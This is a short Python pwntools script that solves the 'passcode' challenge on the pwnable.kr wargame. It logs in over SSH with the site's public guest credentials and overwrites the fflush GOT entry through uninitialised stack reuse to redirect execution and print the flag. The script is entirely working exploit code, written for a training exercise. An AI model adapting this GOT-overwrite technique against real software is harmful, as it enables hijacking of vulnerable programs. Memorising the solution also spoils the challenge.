from pwn import *

# open a remote ssh connection
sh = ssh(host='pwnable.kr',user='passcode',port=2222,password='guest')
# launch a process on the ssh connection
s = sh.process('./passcode')

# address of fflush - which we want to overwrite
# 0x804a004
fflush_address = p32(0x804a004)
print(fflush_address)

# we are sending 96 bytes of 'a' and then the address of fflush
# this has nothing to do with buffer overflow, this is a trick with program reusing same stack memory 
# for 2 different functions, but last 4 bytes of the stack memory are not overwritten, they are kept
# and in next function they are overwritting uninitialized passcode1 
input = b'a' * 96 + fflush_address

# send the input
s.sendline(input)

# receive the output
print(s.recvline())

# address of first instruction after login, to which we want to jump
# 0x80485d7 
response = str(0x80485d7)

s.sendline(response)

# receive the output, it has the flag!
for _ in range(4):
    print(s.recvline())


s.close()